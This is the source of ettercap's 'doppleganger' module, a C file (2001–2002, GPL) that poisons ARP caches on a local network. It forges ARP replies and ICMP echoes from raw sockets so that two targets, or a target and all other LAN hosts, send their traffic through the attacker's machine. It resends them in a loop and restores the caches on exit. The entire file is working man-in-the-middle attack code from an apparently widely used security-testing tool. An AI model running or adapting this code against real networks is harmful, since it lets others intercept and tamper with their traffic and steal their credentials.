/*
    ettercap -- doppleganger -- the ARP poisoner

    Copyright (C) 2001  ALoR <alor@users.sourceforge.net>, NaGA <crwm@freemail.it>

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: ec_doppleganger.c,v 1.7 2002/02/10 10:07:49 alor Exp $
*/

#include "include/ec_main.h"

#include <signal.h>
#include <sys/ioctl.h>

#include "include/ec_inet.h"
#include "include/ec_inet_forge.h"
#include "include/ec_inet_structures.h"
#include "include/ec_error.h"
#include "include/ec_thread.h"


typedef struct {
    char iface[10];
    char IP1[16];
    char IP2[16];
    char MAC1[20];
    char MAC2[20];
} dopple_param;

// global data
u_char *buf1=NULL, *buf2=NULL;

char PoorMAC1[6];
char PoorMAC2[6];
char PoorIP1[17];
char PoorIP2[17];
u_long BroadIP, MyIP, NetMask;
int dopple_sock;

char MyMAC[6];       // my MAC address

// protos...

void Doppleganger_reARP(void *dummy);
pthread_t Doppleganger_Run(char *iface, char *IP1, char *IP2, char *MAC1, char *MAC2);
void * Doppleganger_Main(void *);

// ----------------------------

void Doppleganger_reARP(void *dummy)        // turns back the ARP cache...
{
   int i, j;

#ifdef DEBUG
   Debug_msg("Doppleganger_reARP");
#endif

   // legal ARP reply :)
   for(j=0; j<3; j++)
   {
       if ( ((buf1 && !buf2) || (!buf1 && buf2)) && number_of_hosts_in_lan > 1 )
       {
         for(i = 1; i<number_of_hosts_in_lan; i++)
         {
            if (strcmp(Host_In_LAN[i].ip, PoorIP1) && strcmp(Host_In_LAN[i].ip, PoorIP2))   // don't send to the target
            {
               char SmartMAC1[6];
               char SmartMAC2[6];

               if (buf1)
               {
                  Inet_GetMACfromString(Host_In_LAN[i].mac, SmartMAC1);
                  Inet_Forge_ethernet( buf1, MyMAC, PoorMAC1, ETH_P_ARP );
                  Inet_Forge_arp( buf1+ETH_HEADER, (j%2) ? ARPOP_REQUEST : ARPOP_REPLY,
                                  SmartMAC1, inet_addr(Host_In_LAN[i].ip),
                                  PoorMAC1, inet_addr(PoorIP1) );
                  Inet_SendRawPacket(dopple_sock, buf1, ETH_HEADER + ARP_HEADER);
               }
               if (buf2)
               {
                  Inet_GetMACfromString(Host_In_LAN[i].mac, SmartMAC2);
                  Inet_Forge_ethernet( buf2, MyMAC, PoorMAC2, ETH_P_ARP );
                  Inet_Forge_arp( buf2+ETH_HEADER, (j%2) ? ARPOP_REQUEST : ARPOP_REPLY,
                                  SmartMAC2, inet_addr(Host_In_LAN[i].ip),
                                  PoorMAC2, inet_addr(PoorIP2) );
                  Inet_SendRawPacket(dopple_sock, buf2, ETH_HEADER + ARP_HEADER);
               }
            }
            usleep(Options.storm_delay);
//            #ifdef DEBUG
//               Debug_msg("Doppleganger_reARP -- rearping %d %d ", i, j);
//            #endif
         }
       }

       if (buf1) Inet_Forge_ethernet( buf1, MyMAC, PoorMAC2, ETH_P_ARP );
       if (buf2) Inet_Forge_ethernet( buf2, MyMAC, PoorMAC1, ETH_P_ARP );

       if (buf1)
           Inet_Forge_arp( buf1+ETH_HEADER, (j%2) ? ARPOP_REQUEST : ARPOP_REPLY,
                           PoorMAC1, inet_addr(PoorIP1),
                           PoorMAC2, inet_addr(PoorIP2) );
       if (buf2)
           Inet_Forge_arp( buf2+ETH_HEADER, (j%2) ? ARPOP_REQUEST : ARPOP_REPLY,
                           PoorMAC2, inet_addr(PoorIP2),
                           PoorMAC1, inet_addr(PoorIP1) );

       if (buf1) Inet_SendRawPacket(dopple_sock, buf1, ETH_HEADER + ARP_HEADER);
       usleep(Options.storm_delay);
       if (buf2) Inet_SendRawPacket(dopple_sock, buf2, ETH_HEADER + ARP_HEADER);

       sleep(1);
   }

#ifdef DEBUG
   Debug_msg("Doppleganger_reARP -- END");
#endif

}



void * Doppleganger_Main(void *param)
{
   int MTU, replies=0;
   u_char BroadMAC[6]={0xff,0xff,0xff,0xff,0xff,0xff};


   if (strcmp(((dopple_param *)param)->MAC1,"")) buf1 = Inet_Forge_packet( ETH_HEADER + IP_HEADER + ICMP_HEADER );
   if (strcmp(((dopple_param *)param)->MAC2,"")) buf2 = Inet_Forge_packet( ETH_HEADER + IP_HEADER + ICMP_HEADER );

   if (buf1) Inet_GetMACfromString(((dopple_param *)param)->MAC1, PoorMAC1);
   else memcpy(PoorMAC1, BroadMAC, 6);

   if (buf2) Inet_GetMACfromString(((dopple_param *)param)->MAC2, PoorMAC2);
   else memcpy(PoorMAC2, BroadMAC, 6);

   if (buf1) strlcpy(PoorIP1,((dopple_param *)param)->IP1, 17);
   else strcpy(PoorIP1,"69.69.69.69");

   if (buf2) strlcpy(PoorIP2,((dopple_param *)param)->IP2, 17);
   else strcpy(PoorIP2,"69.69.69.69");

   dopple_sock = Inet_OpenRawSock(((dopple_param *)param)->iface);

   Inet_GetIfaceInfo(((dopple_param *)param)->iface, &MTU, MyMAC, &MyIP, &NetMask);

   BroadIP=(MyIP&NetMask)|(~NetMask);

   // Force IP in ARP cache
   if (buf1 && buf2)
   {
       Inet_Forge_ethernet( buf1, MyMAC, PoorMAC2, ETH_P_IP );
       Inet_Forge_ethernet( buf2, MyMAC, PoorMAC1, ETH_P_IP );

       Inet_Forge_ip( buf1 + ETH_HEADER, inet_addr(PoorIP1), inet_addr(PoorIP2),
                      ICMP_HEADER, 0xe77e, 0, IPPROTO_ICMP );
       Inet_Forge_ip( buf2 + ETH_HEADER, inet_addr(PoorIP2), inet_addr(PoorIP1),
                      ICMP_HEADER, 0xe77e, 0, IPPROTO_ICMP );

       Inet_Forge_icmp( buf1 + ETH_HEADER + IP_HEADER, ICMP_ECHO, 0, NULL, 0 );
       Inet_Forge_icmp( buf2 + ETH_HEADER + IP_HEADER, ICMP_ECHO, 0, NULL, 0 );

       Inet_SendRawPacket(dopple_sock, buf1, ETH_HEADER + IP_HEADER + ICMP_HEADER);
       Inet_SendRawPacket(dopple_sock, buf2, ETH_HEADER + IP_HEADER + ICMP_HEADER);
   }
   else // We don't need other conditions
   {
      int i;
      if (number_of_hosts_in_lan<=1)
      {
         if (buf1)
         {
             Inet_Forge_ethernet( buf1, MyMAC, BroadMAC, ETH_P_IP );
                  Inet_Forge_ip( buf1 + ETH_HEADER, inet_addr(PoorIP1), BroadIP,
                                 ICMP_HEADER, 0xe77e, 0, IPPROTO_ICMP );
                  Inet_Forge_icmp( buf1 + ETH_HEADER + IP_HEADER, ICMP_ECHO, 0, NULL, 0 );
                  Inet_SendRawPacket(dopple_sock, buf1, ETH_HEADER + IP_HEADER + ICMP_HEADER);
         }
         else
         {
             Inet_Forge_ethernet( buf2, MyMAC, BroadMAC, ETH_P_IP );
                  Inet_Forge_ip( buf2 + ETH_HEADER, inet_addr(PoorIP2), BroadIP,
                                 ICMP_HEADER, 0xe77e, 0, IPPROTO_ICMP );
                  Inet_Forge_icmp( buf2 + ETH_HEADER + IP_HEADER, ICMP_ECHO, 0, NULL, 0 );
                  Inet_SendRawPacket(dopple_sock, buf2, ETH_HEADER + IP_HEADER + ICMP_HEADER);
         }
      }

      for(i = 1; i<number_of_hosts_in_lan; i++)
      {
         usleep(Options.storm_delay);

         if (strcmp(Host_In_LAN[i].ip, ((dopple_param *)param)->IP1) && strcmp(Host_In_LAN[i].ip, ((dopple_param *)param)->IP2))   // don't send to the target
         {
            char SmartMAC1[6];
            char SmartMAC2[6];

            if (buf1)
            {
               Inet_GetMACfromString(Host_In_LAN[i].mac, SmartMAC2);
               Inet_Forge_ethernet( buf1, MyMAC, SmartMAC2, ETH_P_IP );
               Inet_Forge_ip( buf1 + ETH_HEADER, inet_addr(PoorIP1), inet_addr(Host_In_LAN[i].ip),
                   ICMP_HEADER, 0xe77e, 0, IPPROTO_ICMP );
               Inet_Forge_icmp( buf1 + ETH_HEADER + IP_HEADER, ICMP_ECHO, 0, NULL, 0 );
               Inet_SendRawPacket(dopple_sock, buf1, ETH_HEADER + IP_HEADER + ICMP_HEADER);
               usleep(Options.storm_delay);
               Inet_Forge_ethernet( buf1, MyMAC, PoorMAC1, ETH_P_IP );
               Inet_Forge_ip( buf1 + ETH_HEADER, inet_addr(Host_In_LAN[i].ip), inet_addr(PoorIP1),
                   ICMP_HEADER, 0xe77e, 0, IPPROTO_ICMP );
               Inet_Forge_icmp( buf1 + ETH_HEADER + IP_HEADER, ICMP_ECHO, 0, NULL, 0 );
               Inet_SendRawPacket(dopple_sock, buf1, ETH_HEADER + IP_HEADER + ICMP_HEADER);
            }
            if (buf2)
            {
               Inet_GetMACfromString(Host_In_LAN[i].mac, SmartMAC1);
               Inet_Forge_ethernet( buf2, MyMAC, SmartMAC1, ETH_P_IP );
               Inet_Forge_ip( buf2 + ETH_HEADER, inet_addr(PoorIP2), inet_addr(Host_In_LAN[i].ip),
                   ICMP_HEADER, 0xe77e, 0, IPPROTO_ICMP );
               Inet_Forge_icmp( buf2 + ETH_HEADER + IP_HEADER, ICMP_ECHO, 0, NULL, 0 );
               Inet_SendRawPacket(dopple_sock, buf2, ETH_HEADER + IP_HEADER + ICMP_HEADER);
               usleep(Options.storm_delay);
               Inet_Forge_ethernet( buf2, MyMAC, PoorMAC2, ETH_P_IP );
               Inet_Forge_ip( buf2 + ETH_HEADER, inet_addr(Host_In_LAN[i].ip), inet_addr(PoorIP2),
                   ICMP_HEADER, 0xe77e, 0, IPPROTO_ICMP );
               Inet_Forge_icmp( buf2 + ETH_HEADER + IP_HEADER, ICMP_ECHO, 0, NULL, 0 );
               Inet_SendRawPacket(dopple_sock, buf2, ETH_HEADER + IP_HEADER + ICMP_HEADER);
            }
         }
      }
   }


   if ( ((buf1 && !buf2) || (!buf1 && buf2)) && number_of_hosts_in_lan > 1 )  // smart ARP
   {
      #ifdef DEBUG
         Debug_msg("Doppleganger_Run -- SMART ARPing... [delay = %d]", Options.delay);
      #endif

      exit_func(Doppleganger_reARP);

      loop
      {
         int i;

         pthread_testcancel();

         for(i = 1; i<number_of_hosts_in_lan; i++)
         {
            usleep(Options.storm_delay);
            if (strcmp(Host_In_LAN[i].ip, ((dopple_param *)param)->IP1) && strcmp(Host_In_LAN[i].ip, ((dopple_param *)param)->IP2))   // don't send to the target
            {
               char SmartMAC1[6];
               char SmartMAC2[6];

               if (buf1)
               {
                  Inet_GetMACfromString(Host_In_LAN[i].mac, SmartMAC2);
                  Inet_Forge_ethernet( buf1, MyMAC, SmartMAC2, ETH_P_ARP );
                  Inet_Forge_arp( buf1+ETH_HEADER, (replies%2) ? ARPOP_REQUEST : ARPOP_REPLY,
                                  MyMAC, inet_addr(PoorIP1),
                                  SmartMAC2, inet_addr(Host_In_LAN[i].ip) );
                  Inet_SendRawPacket(dopple_sock, buf1, ETH_HEADER + ARP_HEADER);
                  usleep(Options.storm_delay);
                  Inet_Forge_ethernet( buf1, MyMAC, PoorMAC1, ETH_P_ARP );
                  Inet_Forge_arp( buf1+ETH_HEADER, (replies%2) ? ARPOP_REQUEST : ARPOP_REPLY,
                                  MyMAC, inet_addr(Host_In_LAN[i].ip),
                                  PoorMAC1, inet_addr(PoorIP1) );
                  Inet_SendRawPacket(dopple_sock, buf1, ETH_HEADER + ARP_HEADER);
               }
               if (buf2)
               {
                  Inet_GetMACfromString(Host_In_LAN[i].mac, SmartMAC1);
                  Inet_Forge_ethernet( buf2, MyMAC, SmartMAC1, ETH_P_ARP );
                  Inet_Forge_arp( buf2+ETH_HEADER, (replies%2) ? ARPOP_REQUEST : ARPOP_REPLY,
                                  MyMAC, inet_addr(PoorIP2),
                                  SmartMAC1, inet_addr(Host_In_LAN[i].ip) );
                  Inet_SendRawPacket(dopple_sock, buf2, ETH_HEADER + ARP_HEADER);
                  usleep(Options.storm_delay);
                  Inet_Forge_ethernet( buf2, MyMAC, PoorMAC2, ETH_P_ARP );
                  Inet_Forge_arp( buf2+ETH_HEADER, (replies%2) ? ARPOP_REQUEST : ARPOP_REPLY,
                                  MyMAC, inet_addr(Host_In_LAN[i].ip),
                                  PoorMAC2, inet_addr(PoorIP2) );
                  Inet_SendRawPacket(dopple_sock, buf2, ETH_HEADER + ARP_HEADER);
               }
            }
         }

         if (replies<4)
            sleep(2);
         else
            sleep(Options.delay);

         replies++;
      }

      exit_func_end();
   }
   else
   {
      #ifdef DEBUG
         if ((buf1 && !buf2) || (!buf1 && buf2))
            Debug_msg("Doppleganger_Run -- PUBLIC ARPing... [delay = %d]", Options.delay);
         else
            Debug_msg("Doppleganger_Run -- ARP POISONing... [delay = %d]", Options.delay);
      #endif

      if (buf1)
      {
          Inet_Forge_ethernet( buf1, MyMAC, PoorMAC2, ETH_P_ARP );
          Inet_Forge_arp( buf1+ETH_HEADER, (replies%2) ? ARPOP_REQUEST : ARPOP_REPLY,
                          MyMAC, inet_addr(PoorIP1),
                          PoorMAC2, inet_addr(PoorIP2) );
      }

      if (buf2)
      {
          Inet_Forge_ethernet( buf2, MyMAC, PoorMAC1, ETH_P_ARP );
          Inet_Forge_arp( buf2+ETH_HEADER, (replies%2) ? ARPOP_REQUEST : ARPOP_REPLY,
                          MyMAC, inet_addr(PoorIP2),
                          PoorMAC1, inet_addr(PoorIP1) );
      }

      exit_func(Doppleganger_reARP);

      loop
      {
         pthread_testcancel();

         if (buf1) Inet_SendRawPacket(dopple_sock, buf1, ETH_HEADER + ARP_HEADER);
         usleep(Options.storm_delay);
         if (buf2) Inet_SendRawPacket(dopple_sock, buf2, ETH_HEADER + ARP_HEADER);

         if (replies<4)
             sleep(2);
         else
             sleep(Options.delay);
         replies++;
      }

      exit_func_end();
   }
   return(0);
}



pthread_t Doppleganger_Run(char *iface, char *IP1, char *IP2, char *MAC1, char *MAC2)
{
   static dopple_param param;

#ifdef DEBUG
       Debug_msg("Doppleganger_Run -- [%s] [%s] [%s] [%s]", IP1, IP2, MAC1, MAC2);
#endif

   strlcpy(param.iface, iface, sizeof(param.iface));
   strlcpy(param.IP1, IP1, sizeof(param.IP1));
   strlcpy(param.IP2, IP2, sizeof(param.IP2));
   strlcpy(param.MAC1, MAC1, sizeof(param.MAC1));
   strlcpy(param.MAC2, MAC2, sizeof(param.MAC2));

   return ECThread_create("dopplega", &Doppleganger_Main, &param);
}

/* EOF */
